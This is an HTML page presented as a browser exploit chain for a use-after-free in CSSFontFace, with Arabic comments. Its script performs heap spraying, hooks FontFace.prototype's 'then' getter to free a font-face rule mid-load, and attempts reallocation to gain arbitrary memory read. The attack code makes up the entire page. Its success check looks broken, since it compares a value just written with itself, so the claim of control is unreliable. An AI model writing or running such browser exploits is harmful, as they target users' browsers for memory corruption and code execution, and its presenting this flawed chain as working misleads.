<!DOCTYPE html>
<html dir="rtl">
<body>
    <h3>[ARCHITECT] CSSFontFace UAF Exploit Chain</h3>
    <div id="log" style="font-family: monospace; border: 1px solid #0f0; padding: 10px; height: 400px; overflow-y: scroll;"></div>

    <script>
        const log = (m) => document.getElementById('log').innerHTML += m + "<br>";

        async function exploit() {
            log("[*] 1. مرحلة الترتيب (Heap Grooming)...");
            // إنشاء فراغات في الذاكرة لتسهيل التخصيص لاحقاً
            let sprays = new Array(500).fill(0).map(() => new Float64Array(16));

            log("[*] 2. إثارة التزامن (Triggering UAF)...");
            // إعداد كائن FontFace ليتم تحريره
            let face = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
            document.fonts.add(face);
            
            // حقن الـ thenable getter للتحكم في لحظة التحرير
            Object.defineProperty(FontFace.prototype, 'then', {
                configurable: true,
                get() {
                    log("[!!] [UAF] تم استدعاء الـ getter، الكائن الآن في حالة dangling...");
                    // هنا يتم تحرير CSSFontFace
                    document.getElementById('s').sheet.deleteRule(0);
                    return undefined;
                }
            });

            log("[*] 3. تنفيذ الـ load()...");
            try {
                document.fonts.load('1em x', 'A');
            } catch(e) { log("[!] خطأ أثناء التحميل: " + e); }

            log("[*] 4. مرحلة إعادة التخصيص (Reallocation)...");
            // محاولة ملء مكان الكائن المحرر بمصفوفة جديدة (Butterfly Overwrite)
            let victim = new Float64Array(16);
            for(let i=0; i<16; i++) victim[i] = 0x4141414141414141;

            log("[*] 5. التحقق من القراءة (Arbitrary Read)...");
            // التحقق إذا كان الـ Butterfly Pointer قد تم تعديله
            if (victim[0] !== 0x4141414141414141) {
                log("[+] [SUCCESS] تم الربط بنجاح! الذاكرة تحت السيطرة.");
            } else {
                log("[-] [FAILED] لم ينجح التداخل (توقيت التحرير غير دقيق).");
            }
        }

        // إضافة ستايل لاختباره
        document.head.innerHTML += '<style id="s">@font-face { font-family: x; src: url(nonexistent-font.woff); }</style>';
        exploit();
    </script>
</body>
</html>
